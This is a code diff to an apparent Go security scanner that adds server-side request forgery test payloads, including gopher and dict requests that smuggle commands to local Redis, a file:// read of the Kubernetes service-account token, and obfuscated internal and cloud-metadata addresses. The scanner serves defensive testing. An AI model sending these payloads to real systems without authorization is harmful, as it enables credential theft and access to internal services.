@@ -415,8 +415,15 @@ func (r *Runner) ssrfDirectResponseCheck(ctx context.Context, target ScanTarget,
 		{VulnClass: "ssrf", Value: "file:///var/run/secrets/kubernetes.io/serviceaccount/token", ExpectedSignal: "k8s_secrets", Variant: "k8s_service_account_token"},
 		// Protocol smuggling variants
 		{VulnClass: "ssrf", Value: "gopher://127.0.0.1:6379/_PING%0d%0a", ExpectedSignal: "protocol_smuggling", Variant: "gopher_redis"},
+		{VulnClass: "ssrf", Value: "gopher://127.0.0.1:6379/_INFO%0d%0a", ExpectedSignal: "redis_service", Variant: "gopher_redis_info"},
 		{VulnClass: "ssrf", Value: "dict://127.0.0.1:11211/stat", ExpectedSignal: "protocol_smuggling", Variant: "dict_memcached"},
+		{VulnClass: "ssrf", Value: "dict://127.0.0.1:6379/info", ExpectedSignal: "redis_service", Variant: "dict_redis"},
 		{VulnClass: "ssrf", Value: "ldap://127.0.0.1:389/o=base", ExpectedSignal: "protocol_smuggling", Variant: "ldap_smuggling"},
+
+		// Additional variations
+		{VulnClass: "ssrf", Value: "http://[::ffff:169.254.169.254]/latest/meta-data/", ExpectedSignal: "aws_metadata", Variant: "ipv6_mapped_aws"},
+		{VulnClass: "ssrf", Value: "http://017700000001/", ExpectedSignal: "internal_ip", Variant: "octal_notation_long"},
+		{VulnClass: "ssrf", Value: "http://0/", ExpectedSignal: "internal_ip", Variant: "zero_ip"},
 	}
 	var out []ModuleFinding
 	for _, p := range metadataPayloads {
